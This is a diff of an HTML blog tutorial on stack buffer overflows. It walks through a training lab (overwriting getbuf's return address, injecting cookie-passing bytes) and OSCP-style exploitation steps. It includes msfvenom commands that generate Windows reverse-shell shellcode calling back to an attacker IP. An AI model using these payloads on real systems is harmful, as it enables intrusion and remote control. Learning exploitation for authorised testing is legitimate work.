@@ -91,15 +91,15 @@
 }</code></pre>            
             <h3>Phase 1 - Basic BoF</h3>
             <p>Summary: Get the size of the buffer, fill the buffer with padding, then point the buffer to the address of the function we want to call</p>
-            <p>For this first phase, we are going to try to get the application to crash by overflowing the stack, but not inject any new code. Specifically, we are going to overflow the stack and change the return address of the function to a different function. In my application, this would be the getbuf function's return address to point to the address of the touch1 function to get a feel for how to do these attacks. </p>
-            <p>To call the touch1 function, first run the ctarget executable in gdb, and set a breakpoint at the getbuf function.</p>
+            <p>For this first phase, we are going to try to get the application to crash by overflowing the stack, but not inject any new code. Specifically, we are going to overflow the stack and change the return address of the function to a different function. In my application, this would be the getbuf function's return address to point to the address of the touch1 function to get a feel for how to do these attacks. 
+            To call the touch1 function, first run the ctarget executable in gdb, and set a breakpoint at the getbuf function.</p>
             <pre><code>b get buf</code></pre>
             <p>To disassemble the getbuf function and get the buffer size, we can use the disas command:</p>
             <pre><code>disas getbuf</code></pre>
             <p>We can then take the buffer size and use it to fill the amount of space we need to force the application to return the touch1 function.</p>
             <img src="https://kogatana-x.github.io/images/Buffer-Overflow/Picture1.png" alt="bof1">
-            <p>If we take a look at the first line, sub $0x28,%rsp, we can see that the buffer size is 0x28, or 40 bytes.</p>
-            <p>To find the address the touch1, you need to get the dissasembled code for ctarget executable.</p>
+            <p>If we take a look at the first line, sub $0x28,%rsp, we can see that the buffer size is 0x28, or 40 bytes.
+            To find the address the touch1, you need to get the dissasembled code for ctarget executable.</p>
             <pre><code>objdump -d ctarget > ctarget_dump.txt</code></pre>
             <p>Then, you can search for the touch1 function in the dump file, my touch1 function was at 0x4c1840, youll know as it looks something like this</p>
             <pre><code>0000000000401760 <touch1>:</code></pre>
@@ -123,10 +123,10 @@
             </pre>    
             <h3>Phase 2 - A little bit harder! Code Injection! </h3>
             <p>Summary: Get the buffer size, get the return address of touch2, modify the %rdi register and store our cookie in it.</p>
-            <p>In phase 2, we are going to be doing basically the same thing as phase 1, but this time we'll inject a small bit of code to make it look like we are passing a cookie as an argument to the second function, touch2.</p>
-            <p>First, we need to find the address of the touch2 function. We can do this by disassembling the ctarget executable and searching for the touch2 function, much like we did in Phase 1.</p>
-            <p>The address of my touch2 is 0x401878. However, this time we also need the address of the cookie we are passing to touch2. With a bit more searching, I found my cookieaddr is 0x10ee1fdf</p>
-            <p>Now we can craft our exploit string. I put the following into a file called 'phase2.s'</p>
+            <p>In phase 2, we are going to be doing basically the same thing as phase 1, but this time we'll inject a small bit of code to make it look like we are passing a cookie as an argument to the second function, touch2.
+            First, we need to find the address of the touch2 function. We can do this by disassembling the ctarget executable and searching for the touch2 function, much like we did in Phase 1.
+            The address of my touch2 is 0x401878. However, this time we also need the address of the cookie we are passing to touch2. With a bit more searching, I found my cookieaddr is 0x10ee1fdf
+            Now we can craft our exploit string. I put the following into a file called 'phase2.s'</p>
             <pre><code>
                 movq $0x10ee1fdf, %rdi
                 retq
@@ -142,8 +142,8 @@
             <pre><code>until *0x401838</code></pre>
             <p>My application prompted me to type a string, so I inputted 40bytes worth of characters, then I executed: </p>
             <pre><code>x/s $rsp</code></pre>
-            <p>Whatever address is returned first is the rsp bytes. In my case this was 0x55656ef8</p>
-            <p>We finally have everything we need to make our exploit code! I made a text file called phase2.txt, buildingn off of what we found in Phase1 and in this phase.</p>
+            <p>Whatever address is returned first is the rsp bytes. In my case this was 0x55656ef8
+            We finally have everything we need to make our exploit code! I made a text file called phase2.txt, buildingn off of what we found in Phase1 and in this phase.</p>
             <pre><code>
                 48 c7 c7 70 4b 4b 43 c3 00 /*cookie*/
                 00 00 00 00 00 00 00 00 00 /* 40 bytes of padding*/
@@ -157,8 +157,8 @@
             <pre><code>./hex2raw < phase2.txt > raw-phase2.txt</code></pre>
             <p>With all of these pieces, I ran the exploit string against the target binary, ctarget</p>
             <pre><code>./ctarget < raw-phase2.txt</code></pre>
-            <p>And the application should crash and return the touch2 function!</p>
-            <p>And that's it! You've successfully exploited a buffer overflow! </p>
+            <p>And the application should crash and return the touch2 function!
+            That's it! You've successfully exploited a buffer overflow! </p>
             <pre>
 ──────────────────────────────────────────────────────────────────────────────────
 
@@ -166,29 +166,29 @@
             <h3>Phase 3 - Taking it a step further</h3>
             <p>For doing BoF attacks for something such as the OSCP, we can take everything a step further and begin automating our processes, and even create shell code to get a reverse shell and easy command execution on the target.</p>
                 <h4>Step 1- Fuzzing</h4>
-                <p>Like we demonstrated earlier, we need to send enough data at once to the target to trigger the overflow and crash the application. We can use fuzzing to our advantage, by sending increasing payloads with different characters within a debugger</p>
-                <p>Tools we can use to monitor the target include Immunity Debugger, Ollydbg, WinDbg, and GDB.</p>
-                <p>And to Fuzz the target we can use a script such as this one: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/fuzzer.py">Fuzzer.py</a></p>
+                <p>Like we demonstrated earlier, we need to send enough data at once to the target to trigger the overflow and crash the application. We can use fuzzing to our advantage, by sending increasing payloads with different characters within a debugger
+                Tools we can use to monitor the target include Immunity Debugger, Ollydbg, WinDbg, and GDB.
+                And to Fuzz the target we can use a script such as this one: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/fuzzer.py">Fuzzer.py</a></p>
             
                 <h4>Step 2 - Finding the Offset</h4>
-                <p>Once we have crashed the application, we need to find the offset of the EIP. We can do this by sending a unique string of characters to the target and monitoring the EIP register in the debugger.</p>
-                <p>We can even change the payload to a unique string so that when the target crashes, EIP will hold an offest that tells us how much data is needed to overwrite EIP</p>
-                <p>To generate this unique string of the Buffer that we found in step 1, we can use msf-pattern_create, and <a href="https://github.com/spaceyowie/oscp-bof/blob/main/eip_offset.py">EIP_Offset.py</a></p>
+                <p>Once we have crashed the application, we need to find the offset of the EIP. We can do this by sending a unique string of characters to the target and monitoring the EIP register in the debugger.
+                We can even change the payload to a unique string so that when the target crashes, EIP will hold an offest that tells us how much data is needed to overwrite EIP
+                To generate this unique string of the Buffer that we found in step 1, we can use msf-pattern_create, and <a href="https://github.com/spaceyowie/oscp-bof/blob/main/eip_offset.py">EIP_Offset.py</a></p>
                 <pre><code>msf-pattern_create -l $buffer_size</code></pre>
                 <p>Then we can send this string to the target and monitor the EIP register</p>
                 <pre><code>msf-pattern_offset -l $buffer_size -q $EIP</code></pre>
-                <p>And we will get the offset of the EIP</p>
-                <p>We can make a PoC with something such as this script: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/eip_control.py">EIP_Control.py</a></p>
+                <p>And we will get the offset of the EIP
+                We can make a PoC with something such as this script: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/eip_control.py">EIP_Control.py</a></p>
         
                 <h4>Step 3 - Evaluating Shellcode Payload Space</h4>
-                <p>Now that we know the offset of the EIP, we can begin to evaluate the space we have to work with for our shellcode. </p>
-                <p>Depending on the shellcode you intend to use, around 500 bytes of room is required.</p>
-                <p>The space can be identifyed by sending the amount of bytes you need after the initial overflow</p>
-                <p>And we can use a script such as this one to generate the space: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/shellcode_space.py">Shellcode_Space.py</a></p>
+                <p>Now that we know the offset of the EIP, we can begin to evaluate the space we have to work with for our shellcode. 
+                Depending on the shellcode you intend to use, around 500 bytes of room is required.
+                The space can be identifyed by sending the amount of bytes you need after the initial overflow
+                And we can use a script such as this one to generate the space: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/shellcode_space.py">Shellcode_Space.py</a></p>
 
                 <h4>Step 4 - Finding Bad Characters</h4>
-                <p>Bad characters are characters that can break the shellcode. We need to identify these characters and avoid them in our shellcode.</p>
-                <p>We can use a script such as this one to identify bad characters: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/badchars_check.py">Badchars_Check.py</a></p>
+                <p>Bad characters are characters that can break the shellcode. We need to identify these characters and avoid them in our shellcode.
+                We can use a script such as this one to identify bad characters: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/badchars_check.py">Badchars_Check.py</a></p>
 
                 <h4>Step 5 - Finding the Return Address</h4>
                 <p>After identifying bad characters, we need to locate a reliable **JMP ESP** instruction. If **EIP** can be redirected to this instruction, and **ESP** points to the start of our shellcode, our shellcode will execute.</p>
@@ -208,21 +208,21 @@
                 <h4>Step 6 - Generating Shellcode</h4>
                 <p>With the **JMP ESP** pointer identified, we can generate shellcode using **msfvenom**. The shellcode should be encoded to avoid bad characters.</p>
                 <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -b "<bad characters>" -f python</code></pre>
-                <p>Be sure to replace `<attacker IP>` and `<attacker port>` with the IP address and port of the attacking machine, and `<bad characters>` with any identified bad characters.</p>
-                <p>Additionally, the shellcode should be encoded using the **x86/shikata_ga_nai** encoder to avoid bad characters: 
+                <p>Be sure to replace `<attacker IP>` and `<attacker port>` with the IP address and port of the attacking machine, and `<bad characters>` with any identified bad characters.
+                Additionally, the shellcode should be encoded using the **x86/shikata_ga_nai** encoder to avoid bad characters: </p>
                     <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -b "<bad characters>" -f python -e x86/shikata_ga_nai</code></pre>
-                </p>
-                <p>Finally, the shellcode should be formatted to be used in the exploit script.</p>
-                <p>And we can use a script such as this one to generate the exploit: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/exploit.py">Exploit.py</a></p>
+                
+                <p>Finally, the shellcode should be formatted to be used in the exploit script.
+                And we can use a script such as this one to generate the exploit: <a href="https://github.com/spaceyowie/oscp-bof/blob/main/exploit.py">Exploit.py</a></p>
             <pre>
 ──────────────────────────────────────────────────────────────────────────────────
 
             </pre>            
             <h2>Conclusion</h2>
-            <p>Buffer Overflows are a powerful tool in the arsenal of a pentester, and can be used to exploit a wide variety of applications. By following the steps outlined in this post, you can begin to understand how to perform a buffer overflow attack and exploit vulnerable applications. </p>
-            <p>Remember, always ensure you have permission to perform a buffer overflow attack on a target, and never use this knowledge for malicious purposes. </p>
-            <p>Happy Hacking!</p>
-            <p>If you want to learn more about buffer over flow attacks, or are still confused, check out this guide! <a href="https://lightfootlabs.io/resources/Learn-Buffer-Overflows-through-Visuals">Visual BoF</a></p>
+            <p>Buffer Overflows are a powerful tool in the arsenal of a pentester, and can be used to exploit a wide variety of applications. By following the steps outlined in this post, you can begin to understand how to perform a buffer overflow attack and exploit vulnerable applications. 
+            Remember, always ensure you have permission to perform a buffer overflow attack on a target, and never use this knowledge for malicious purposes. 
+            Happy Hacking!
+            If you want to learn more about buffer over flow attacks, or are still confused, check out this guide! <a href="https://lightfootlabs.io/resources/Learn-Buffer-Overflows-through-Visuals">Visual BoF</a></p>
         
             </div>
     </div>
